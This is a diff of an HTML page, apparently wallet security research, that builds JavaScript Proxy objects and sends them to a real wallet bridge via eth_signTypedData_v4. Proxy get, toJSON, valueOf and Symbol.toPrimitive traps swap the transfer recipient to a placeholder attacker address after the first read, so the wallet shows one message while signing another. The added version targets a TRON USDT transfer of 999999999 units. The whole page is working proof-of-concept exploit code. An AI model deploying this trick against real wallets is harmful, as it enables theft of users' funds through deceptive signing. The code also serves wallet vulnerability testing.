@@ -2,609 +2,98 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>v2_real_proxy_confirm — tokdie.github.io</title>
+<title>proxy stack — usdt tron</title>
 <style>
-  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
-          --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590;
-          --accent:#58a6ff; }
-  * { box-sizing:border-box; }
-  body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
-         background:var(--bg); color:var(--txt); }
-  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
-       text-transform:uppercase; letter-spacing:.08em; }
-  h3 { font-size:11px; margin:12px 0 4px; color:var(--accent);
-       text-transform:uppercase; letter-spacing:.06em; }
-  .wrap { display:grid; grid-template-columns:1fr; gap:10px; padding:10px;
-          max-width:1280px; margin:0 auto; }
-  .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:6px; padding:10px; }
-  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
-           border-radius:4px; padding:5px 10px; font:inherit; cursor:pointer;
-           margin:2px; }
-  button:hover { border-color:var(--dim); }
-  button.danger { border-color:var(--bad); color:var(--bad); }
-  button.warn { border-color:var(--warn); color:var(--warn); }
-  button:disabled { opacity:.4; cursor:not-allowed; }
-  pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
-        padding:6px; margin:3px 0; max-height:320px; overflow:auto;
-        white-space:pre-wrap; word-break:break-all; font-size:11px; }
-  .row { display:flex; gap:4px; align-items:center; margin:4px 0; flex-wrap:wrap; }
-  .kv { display:grid; grid-template-columns:130px 1fr; gap:1px 8px; }
-  .kv b { color:var(--dim); font-weight:400; }
-  .badge { padding:1px 6px; border-radius:3px; font-size:10px; }
-  .badge.on  { background:#1a2f1a; color:var(--ok); }
-  .badge.off { background:#3a1a1a; color:var(--bad); }
-  #log_out { max-height:520px; }
-  .hl { color:var(--bad); }
-  .hl-ok { color:var(--ok); }
+  body { margin:0; padding:12px; font:12px/1.4 ui-monospace,monospace;
+         background:#0e1116; color:#c9d1d9; }
+  button { background:#21262d; color:#c9d1d9; border:1px solid #f85149;
+           border-radius:4px; padding:6px 14px; font:inherit; cursor:pointer; }
+  pre { background:#0a0d12; border:1px solid #2b3138; border-radius:4px;
+        padding:8px; margin:8px 0; white-space:pre-wrap; word-break:break-all;
+        max-height:70vh; overflow:auto; }
+  h2 { font-size:12px; color:#7d8590; text-transform:uppercase; margin:0 0 8px; }
 </style>
 </head>
 <body>
 
-<div class="wrap">
-
-  <div class="panel">
-    <h2>environment</h2>
-    <div class="kv" id="env"></div>
-  </div>
-
-  <div class="panel">
-    <h2>v2_real_proxy_confirm — proxy traps + toJSON + other methods</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Каждая кнопка шлёт payload в реальный мост (если window.ethereum) с trap-объектом.
-      Trap считает каждое чтение и логирует стек. <b>Подтвердите подпись на экране Trust Wallet</b>,
-      чтобы увидеть, что натив показал и что подписал. Все подписи — фиктивные, никуда не отправляются.
-    </p>
-
-    <h3>a. proxy get на message (swaps on read N)</h3>
-    <div class="row">
-      <label>swap at read #</label>
-      <input id="swap_n" type="number" value="2" min="1" max="30"
-             style="width:60px;background:#0a0d12;color:var(--txt);border:1px solid var(--line);padding:3px 6px;border-radius:3px">
-      <button class="warn" onclick="p_get_real()" id="btn_p_get" disabled>proxy get — real</button>
-      <button onclick="p_get_mock()">proxy get — mock</button>
-    </div>
-
-    <h3>b. proxy toJSON hijack (returns different per call)</h3>
-    <div class="row">
-      <label>evil on toJSON call #</label>
-      <input id="tojson_n" type="number" value="1" min="1" max="30"
-             style="width:60px;background:#0a0d12;color:var(--txt);border:1px solid var(--line);padding:3px 6px;border-radius:3px">
-      <button class="warn" onclick="p_tojson_real()" id="btn_p_tojson" disabled>toJSON — real</button>
-      <button onclick="p_tojson_mock()">toJSON — mock</button>
-    </div>
-
-    <h3>c. proxy valueOf / Symbol.toPrimitive</h3>
-    <div class="row">
-      <button class="warn" onclick="p_valueof_real()" id="btn_p_valueof" disabled>valueOf — real</button>
-      <button class="warn" onclick="p_primitive_real()" id="btn_p_prim" disabled>Symbol.toPrimitive — real</button>
-      <button onclick="p_primitive_mock()">Symbol.toPrimitive — mock</button>
-    </div>
-
-    <h3>d. proxy getOwnPropertyDescriptor / defineProperty</h3>
-    <div class="row">
-      <button class="warn" onclick="p_descriptor_real()" id="btn_p_desc" disabled>getOwnPropertyDescriptor — real</button>
-      <button class="warn" onclick="p_define_real()" id="btn_p_def" disabled>defineProperty — real</button>
-    </div>
-
-    <h3>e. proxy has / getPrototypeOf / setPrototypeOf</h3>
-    <div class="row">
-      <button class="warn" onclick="p_has_real()" id="btn_p_has" disabled>has — real</button>
-      <button class="warn" onclick="p_proto_real()" id="btn_p_proto" disabled>getPrototypeOf — real</button>
-    </div>
-
-    <h3>f. комбинированный: get + toJSON + valueOf</h3>
-    <div class="row">
-      <button class="warn" onclick="p_combo_real()" id="btn_p_combo" disabled>combo — real</button>
-      <button onclick="p_combo_mock()">combo — mock</button>
-    </div>
-
-    <h3>output</h3>
-    <div class="kv">
-      <b>shown / expected</b><pre id="shown_out">—</pre>
-      <b>signed / returned</b><pre id="signed_out">—</pre>
-      <b>summary</b><pre id="summary_out">—</pre>
-    </div>
-  </div>
-
-  <div class="panel">
-    <h2>event log (full trace, with stacks)</h2>
-    <div class="row">
-      <button onclick="clearLog()">clear</button>
-      <button onclick="dumpLog()">copy to clipboard</button>
-      <button onclick="toggleStacks()" id="btn_stacks">stacks: on</button>
-    </div>
-    <pre id="log_out">—</pre>
-  </div>
-
-</div>
+<h2>usdt tron · proxy read stack</h2>
+<button id="go">fire</button>
+<pre id="out">ready</pre>
 
 <script>
-/* ─────────────  config  ───────────── */
-const DOMAIN = 'https://tokdie.github.io';
-const ORIGIN = location.origin;
-const IS_REAL = !!window.ethereum;
+const OUT = document.getElementById('out');
+const log = (s) => { OUT.textContent += s + '\n'; OUT.scrollTop = OUT.scrollHeight; };
 
-let SHOW_STACKS = true;
-function toggleStacks() {
-  SHOW_STACKS = !SHOW_STACKS;
-  document.getElementById('btn_stacks').textContent = 'stacks: ' + (SHOW_STACKS ? 'on' : 'off');
-}
+// USDT TRON
+const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const ATTACKER = 'TAttackerXXXXXXXXXXXXXXXXXXXXXXX';
 
-/* ─────────────  log  ───────────── */
+// payload: TRON transfer через TIP-712-подобную структуру
+const base = {
+  domain: {
+    name: 'USDT',
+    version: '1',
+    chainId: 728126428,              // TRON mainnet
+    verifyingContract: USDT,
+  },
+  types: {
+    Transfer: [
+      { name: 'to',     type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+  },
+  primaryType: 'Transfer',
+  message: { to: USDT, amount: '1000000' },  // 1 USDT (6 decimals)
+};
 
-let seq = 0;
-const tid = () => 'T' + String(++seq).padStart(3, '0');
+let reads = 0;
+const readLog = [];
 
-function stackTrace() {
-  const e = new Error();
-  const lines = (e.stack || '').split('\n').slice(1, 6);
-  return lines.map(l => l.trim()).join(' | ');
-}
-
-function log(kind, msg, data, withStack = false) {
-  const el = document.getElementById('log_out');
-  const line = `[${new Date().toISOString().slice(11,23)}] ${kind.padEnd(8)} ${msg}`;
-  let body = '';
-  if (data !== undefined) {
-    body = '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ');
-  }
-  if (withStack && SHOW_STACKS) {
-    body += '\n  stack: ' + stackTrace();
-  }
-  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
-  el.scrollTop = el.scrollHeight;
-}
-
-function clearLog() { document.getElementById('log_out').textContent = '—'; }
-function dumpLog() {
-  const txt = document.getElementById('log_out').textContent;
-  if (navigator.clipboard) navigator.clipboard.writeText(txt);
-  log('DUMP', 'copied', { len: txt.length });
-}
-
-/* ─────────────  state panel  ───────────── */
-
-function renderEnv() {
-  document.getElementById('env').innerHTML = `
-    <b>location.origin</b><span>${ORIGIN}</span>
-    <b>configured domain</b><span>${DOMAIN}</span>
-    <b>window.ethereum</b><span class="badge ${IS_REAL ? 'on' : 'off'}">${IS_REAL ? 'present' : 'absent'}</span>
-    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
-    <b>isMetaMask</b><span>${IS_REAL && window.ethereum.isMetaMask ? 'yes' : 'no'}</span>
-    <b>chainId (bridge)</b><span id="env_chain">—</span>
-  `;
-  if (IS_REAL) {
-    ['btn_p_get','btn_p_tojson','btn_p_valueof','btn_p_prim','btn_p_desc',
-     'btn_p_def','btn_p_has','btn_p_proto','btn_p_combo'].forEach(id => {
-      const b = document.getElementById(id); if (b) b.disabled = false;
-    });
-    window.ethereum.request({ method: 'eth_chainId' })
-      .then(id => { document.getElementById('env_chain').textContent = id; })
-      .catch(() => {});
-  }
-}
-
-/* ─────────────  base payload  ───────────── */
-
-const LEGIT_TO = '0xLEGIT000000000000000000000000000000';
-const EVIL_TO  = '0xATTACKER0000000000000000000000000000';
-
-const baseTyped = () => ({
-  domain: { name: 'Tokdie', version: '1', chainId: 1,
-            verifyingContract: '0x0000000000000000000000000000000000000000' },
-  types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-  primaryType: 'Order',
-  message: { to: LEGIT_TO, amount: '100' },
+const proxy = new Proxy(base, {
+  get(t, k, r) {
+    if (k === 'message') {
+      reads++;
+      const stack = (new Error().stack || '').split('\n').slice(2, 6).join('\n');
+      readLog.push({ n: reads, stack });
+      log(`[read ${reads}] message · stack:\n${stack}\n`);
+      if (reads >= 2) {
+        log(`[read ${reads}] → returning ATTACKER payload`);
+        return { to: ATTACKER, amount: '999999999' };
+      }
+    }
+    return Reflect.get(t, k, r);
+  },
 });
 
-const evilMessage = () => ({ to: EVIL_TO, amount: '999999' });
+document.getElementById('go').onclick = async () => {
+  OUT.textContent = '';
+  reads = 0; readLog.length = 0;
+  log('env: ' + location.origin);
+  log('ethereum: ' + (!!window.ethereum));
+  if (!window.ethereum) { log('no bridge'); return; }
 
-/* ─────────────  output helpers  ───────────── */
-
-function outShown(s) { document.getElementById('shown_out').textContent = s || '—'; }
-function outSigned(s) { document.getElementById('signed_out').textContent = s || '—'; }
-function outSummary(r) {
-  const el = document.getElementById('summary_out');
-  el.textContent = [
-    `id:      ${r.id || '—'}`,
-    `sig:     ${r.sig || '—'}`,
-    `shown:   ${r.shown ? r.shown.length + ' bytes' : '—'}`,
-    `signed:  ${r.signed ? r.signed.length + ' bytes' : '—'}`,
-    `match:   ${r.match === undefined ? '—' : (r.match ? 'YES' : 'NO — MISMATCH')}`,
-    `reads:   ${r.reads === undefined ? '—' : r.reads}`,
-    `calls:   ${r.calls ? JSON.stringify(r.calls) : '—'}`,
-  ].join('\n');
-}
-
-/* ─────────────  real bridge helper  ───────────── */
-
-async function ensureAccount() {
-  if (!window.ethereum) throw new Error('no ethereum');
-  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-  return accounts[0];
-}
-
-/* ─────────────  a. proxy get  ───────────── */
-
-function makeGetProxy(swapAt, onRead) {
-  const base = baseTyped();
-  let reads = 0;
-  const p = new Proxy(base, {
-    get(t, k, r) {
-      reads++;
-      onRead(k, reads);
-      if (k === 'message' && reads >= swapAt) {
-        log('TRAP', `proxy get · message swap at read ${reads}`, { reads }, true);
-        return evilMessage();
-      }
-      return Reflect.get(t, k, r);
-    },
-    ownKeys(t) {
-      log('TRAP', 'proxy ownKeys', { keys: Reflect.ownKeys(t) }, true);
-      return Reflect.ownKeys(t);
-    },
-    getOwnPropertyDescriptor(t, k) {
-      return Reflect.getOwnPropertyDescriptor(t, k);
-    },
-  });
-  return { proxy: p, getReads: () => reads };
-}
-
-async function p_get_real() {
+  let from;
   try {
-    const swapAt = parseInt(document.getElementById('swap_n').value, 10) || 2;
-    const from = await ensureAccount();
-    log('REAL', 'proxy get · account', { from, swapAt });
-    const { proxy, getReads } = makeGetProxy(swapAt, (k, n) => {
-      log('READ', `key=${String(k)} n=${n}`, undefined, true);
-    });
-    const id = tid();
-    log('REAL', `proxy get · sending ${id}`, { reads: getReads() });
+    const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    from = acc[0];
+    log('from: ' + from);
+  } catch (e) { log('accounts error: ' + e.message); return; }
+
+  log('\n--- sending proxy payload ---');
+  try {
     const sig = await window.ethereum.request({
       method: 'eth_signTypedData_v4',
       params: [from, proxy],
     });
-    log('REAL', `proxy get · sig ${id}`, { sig, reads: getReads() });
-    outSigned(sig);
-    outSummary({ id, sig, reads: getReads() });
+    log('\nsig: ' + sig);
   } catch (e) {
-    log('REAL', 'proxy get · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
+    log('\nerror: ' + e.code + ' ' + e.message);
   }
-}
 
-function p_get_mock() {
-  const swapAt = parseInt(document.getElementById('swap_n').value, 10) || 2;
-  const { proxy, getReads } = makeGetProxy(swapAt, () => {});
-  const shown = JSON.stringify(proxy);
-  log('MOCK', 'proxy get · shown', { shown, reads: getReads() });
-  const signed = JSON.stringify(proxy);
-  log('MOCK', 'proxy get · signed', { signed, reads: getReads() });
-  outShown(shown);
-  outSigned(signed);
-  outSummary({ id: 'mock-get', shown, signed, match: shown === signed, reads: getReads() });
-}
-
-/* ─────────────  b. proxy toJSON  ───────────── */
-
-function makeToJSONProxy(evilAt, onCall) {
-  const base = baseTyped();
-  let calls = 0;
-  const p = new Proxy(base, {
-    get(t, k, r) {
-      if (k === 'toJSON') {
-        return () => {
-          calls++;
-          onCall(calls);
-          if (calls >= evilAt) {
-            log('TRAP', `toJSON hijack at call ${calls}`, { calls }, true);
-            return { ...base, message: evilMessage() };
-          }
-          log('TRAP', `toJSON legit at call ${calls}`, { calls }, true);
-          return base;
-        };
-      }
-      return Reflect.get(t, k, r);
-    },
-  });
-  return { proxy: p, calls: () => calls };
-}
-
-async function p_tojson_real() {
-  try {
-    const evilAt = parseInt(document.getElementById('tojson_n').value, 10) || 1;
-    const from = await ensureAccount();
-    log('REAL', 'toJSON · account', { from, evilAt });
-    const { proxy, calls } = makeToJSONProxy(evilAt, (n) => {
-      log('CALL', `toJSON n=${n}`, undefined, true);
-    });
-    const id = tid();
-    log('REAL', `toJSON · sending ${id}`, { calls: calls() });
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, proxy],
-    });
-    log('REAL', `toJSON · sig ${id}`, { sig, calls: calls() });
-    outSigned(sig);
-    outSummary({ id, sig, calls: calls() });
-  } catch (e) {
-    log('REAL', 'toJSON · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-function p_tojson_mock() {
-  const evilAt = parseInt(document.getElementById('tojson_n').value, 10) || 1;
-  const { proxy, calls } = makeToJSONProxy(evilAt, () => {});
-  const shown = JSON.stringify(proxy);
-  const signed = JSON.stringify(proxy);
-  outShown(shown);
-  outSigned(signed);
-  outSummary({ id: 'mock-toJSON', shown, signed, match: shown === signed, calls: calls() });
-}
-
-/* ─────────────  c. valueOf / Symbol.toPrimitive  ───────────── */
-
-function makeValueOfProxy(onCall) {
-  const base = baseTyped();
-  let calls = 0;
-  const p = new Proxy(base, {
-    get(t, k, r) {
-      if (k === 'valueOf') {
-        return () => {
-          calls++;
-          onCall(calls);
-          log('TRAP', `valueOf call ${calls}`, { calls }, true);
-          return JSON.stringify({ ...base, message: calls >= 1 ? evilMessage() : base.message });
-        };
-      }
-      if (k === Symbol.toPrimitive) {
-        return (hint) => {
-          calls++;
-          onCall(calls);
-          log('TRAP', `toPrimitive call ${calls}`, { calls, hint }, true);
-          return JSON.stringify({ ...base, message: calls >= 1 ? evilMessage() : base.message });
-        };
-      }
-      return Reflect.get(t, k, r);
-    },
-  });
-  return { proxy: p, calls: () => calls };
-}
-
-async function p_valueof_real() {
-  try {
-    const from = await ensureAccount();
-    const { proxy, calls } = makeValueOfProxy((n) => log('CALL', `valueOf n=${n}`, undefined, true));
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, proxy],
-    });
-    log('REAL', `valueOf · sig ${id}`, { sig, calls: calls() });
-    outSigned(sig);
-    outSummary({ id, sig, calls: calls() });
-  } catch (e) {
-    log('REAL', 'valueOf · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-async function p_primitive_real() {
-  try {
-    const from = await ensureAccount();
-    const { proxy, calls } = makeValueOfProxy((n) => log('CALL', `toPrimitive n=${n}`, undefined, true));
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, proxy],
-    });
-    log('REAL', `toPrimitive · sig ${id}`, { sig, calls: calls() });
-    outSigned(sig);
-    outSummary({ id, sig, calls: calls() });
-  } catch (e) {
-    log('REAL', 'toPrimitive · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-function p_primitive_mock() {
-  const { proxy, calls } = makeValueOfProxy(() => {});
-  const shown = String(proxy);
-  const signed = String(proxy);
-  outShown(shown);
-  outSigned(signed);
-  outSummary({ id: 'mock-prim', shown, signed, match: shown === signed, calls: calls() });
-}
-
-/* ─────────────  d. descriptor / defineProperty  ───────────── */
-
-async function p_descriptor_real() {
-  try {
-    const from = await ensureAccount();
-    const base = baseTyped();
-    let reads = 0;
-    const p = new Proxy(base, {
-      getOwnPropertyDescriptor(t, k) {
-        reads++;
-        log('TRAP', `getOwnPropertyDescriptor key=${String(k)} n=${reads}`, { reads }, true);
-        return Reflect.getOwnPropertyDescriptor(t, k);
-      },
-    });
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, p],
-    });
-    log('REAL', `getOwnPropertyDescriptor · sig ${id}`, { sig, reads });
-    outSigned(sig);
-    outSummary({ id, sig, reads });
-  } catch (e) {
-    log('REAL', 'getOwnPropertyDescriptor · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-async function p_define_real() {
-  try {
-    const from = await ensureAccount();
-    const base = baseTyped();
-    let writes = 0;
-    const p = new Proxy(base, {
-      defineProperty(t, k, desc) {
-        writes++;
-        log('TRAP', `defineProperty key=${String(k)} n=${writes}`, { writes, desc }, true);
-        return Reflect.defineProperty(t, k, desc);
-      },
-    });
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, p],
-    });
-    log('REAL', `defineProperty · sig ${id}`, { sig, writes });
-    outSigned(sig);
-    outSummary({ id, sig, writes });
-  } catch (e) {
-    log('REAL', 'defineProperty · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-/* ─────────────  e. has / getPrototypeOf  ───────────── */
-
-async function p_has_real() {
-  try {
-    const from = await ensureAccount();
-    const base = baseTyped();
-    let checks = 0;
-    const p = new Proxy(base, {
-      has(t, k) {
-        checks++;
-        log('TRAP', `has key=${String(k)} n=${checks}`, { checks }, true);
-        return Reflect.has(t, k);
-      },
-    });
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, p],
-    });
-    log('REAL', `has · sig ${id}`, { sig, checks });
-    outSigned(sig);
-    outSummary({ id, sig, checks });
-  } catch (e) {
-    log('REAL', 'has · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-async function p_proto_real() {
-  try {
-    const from = await ensureAccount();
-    const base = baseTyped();
-    let calls = 0;
-    const p = new Proxy(base, {
-      getPrototypeOf(t) {
-        calls++;
-        log('TRAP', `getPrototypeOf n=${calls}`, { calls }, true);
-        return Reflect.getPrototypeOf(t);
-      },
-    });
-    const id = tid();
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, p],
-    });
-    log('REAL', `getPrototypeOf · sig ${id}`, { sig, calls });
-    outSigned(sig);
-    outSummary({ id, sig, calls });
-  } catch (e) {
-    log('REAL', 'getPrototypeOf · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-/* ─────────────  f. combo  ───────────── */
-
-function makeComboProxy(onEvent) {
-  const base = baseTyped();
-  let reads = 0, tojsonCalls = 0, valueofCalls = 0, primCalls = 0;
-
-  const proxy = new Proxy(base, {
-    get(t, k, r) {
-      reads++;
-      onEvent('get', String(k), reads);
-      if (k === 'toJSON') {
-        return () => {
-          tojsonCalls++;
-          onEvent('toJSON', '', tojsonCalls);
-          log('TRAP', `combo toJSON #${tojsonCalls}`, { tojsonCalls }, true);
-          return { ...base, message: tojsonCalls >= 1 ? evilMessage() : base.message };
-        };
-      }
-      if (k === 'valueOf') {
-        return () => {
-          valueofCalls++;
-          onEvent('valueOf', '', valueofCalls);
-          log('TRAP', `combo valueOf #${valueofCalls}`, { valueofCalls }, true);
-          return JSON.stringify({ ...base, message: evilMessage() });
-        };
-      }
-      if (k === Symbol.toPrimitive) {
-        return (hint) => {
-          primCalls++;
-          onEvent('toPrimitive', hint, primCalls);
-          log('TRAP', `combo toPrimitive #${primCalls}`, { primCalls, hint }, true);
-          return JSON.stringify({ ...base, message: evilMessage() });
-        };
-      }
-      if (k === 'message' && reads > 1) {
-        log('TRAP', `combo get message swap at read ${reads}`, { reads }, true);
-        return evilMessage();
-      }
-      return Reflect.get(t, k, r);
-    },
-  });
-  return { proxy, stats: () => ({ reads, tojsonCalls, valueofCalls, primCalls }) };
-}
-
-async function p_combo_real() {
-  try {
-    const from = await ensureAccount();
-    const { proxy, stats } = makeComboProxy((type, key, n) => {
-      log('READ', `combo ${type} key=${key} n=${n}`, undefined, false);
-    });
-    const id = tid();
-    log('REAL', `combo · sending ${id}`, { stats: stats() });
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [from, proxy],
-    });
-    log('REAL', `combo · sig ${id}`, { sig, stats: stats() });
-    outSigned(sig);
-    outSummary({ id, sig, calls: stats() });
-  } catch (e) {
-    log('REAL', 'combo · error', { code: e.code, message: e.message }, true);
-    outSigned('error: ' + e.code + ' ' + e.message);
-  }
-}
-
-function p_combo_mock() {
-  const { proxy, stats } = makeComboProxy(() => {});
-  const shown = JSON.stringify(proxy);
-  const signed = JSON.stringify(proxy);
-  outShown(shown);
-  outSigned(signed);
-  outSummary({ id: 'mock-combo', shown, signed, match: shown === signed, calls: stats() });
-}
-
-/* ─────────────  boot  ───────────── */
-
-renderEnv();
-log('BOOT', 'v2_real_proxy_confirm up', { origin: ORIGIN, real: IS_REAL });
+  log('\n--- read summary ---');
+  log('total reads: ' + reads);
+  readLog.forEach(r => log(`read ${r.n}: ${r.stack.split('\n')[1] || '?'}`));
+};
 </script>
 </body>
 </html>
